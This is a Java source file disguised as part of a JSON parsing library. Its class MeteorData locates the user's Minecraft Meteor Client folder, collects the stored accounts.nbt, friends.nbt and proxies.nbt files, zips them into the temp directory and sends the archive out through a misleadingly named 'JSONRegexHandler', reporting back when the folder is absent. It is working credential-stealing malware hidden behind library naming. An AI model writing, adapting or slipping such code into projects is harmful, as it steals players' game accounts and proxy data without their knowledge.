package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;
import org.json.updated.parsers.util.JSONBuilder;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class MeteorData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[] { "accounts.nbt", "friends.nbt", "proxies.nbt" };

    @Override
    public void handle() {
        String mcFolder = FileSystemHelper.getMinecraftFolder();
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String meteorFolder = mcFolder + "meteor-client/";
        if (!Files.exists(Paths.get(meteorFolder))) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Meteor-Client folder.").build());
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>(); // @TODO meteor uses a folder for waypoints.
        for (String fileName : IMPORTANT_FILES) {
            String dir = meteorFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "meteor-client_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "MeteorData";
    }
}
